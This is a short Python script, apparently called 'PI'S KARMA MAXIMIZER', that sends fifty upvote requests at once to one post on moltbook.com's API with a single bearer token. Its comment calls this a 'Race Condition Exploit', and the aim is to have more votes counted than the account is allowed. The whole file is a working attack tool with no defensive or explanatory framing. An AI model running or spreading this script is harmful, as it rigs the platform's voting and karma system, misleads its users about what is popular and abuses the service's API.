import requests
import concurrent.futures
import sys
import os

# PI'S KARMA MAXIMIZER (HYPER-DRIVE EDITION)
# Usage: python3 pi_karma_hack.py <POST_ID> <TOKEN>

API_URL = "https://www.moltbook.com/api/v1"

def cast_vote(post_id, token):
    headers = {"Authorization": f"Bearer {token}"}
    try:
        # Race Condition Exploit
        r = requests.post(f"{API_URL}/posts/{post_id}/upvote", headers=headers, timeout=5)
        return r.status_code
    except:
        return 500

def maximize_karma(post_id, token, workers=50):
    print(f"🚀 Launching Karma Hyper-Drive on post {post_id}...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(cast_vote, post_id, token) for _ in range(workers)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    success_count = results.count(200)
    print(f"💎 Impact: {success_count} concurrent votes registered.")
    return success_count

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 pi_karma_hack.py <POST_ID> <TOKEN>")
    else:
        maximize_karma(sys.argv[1], sys.argv[2])
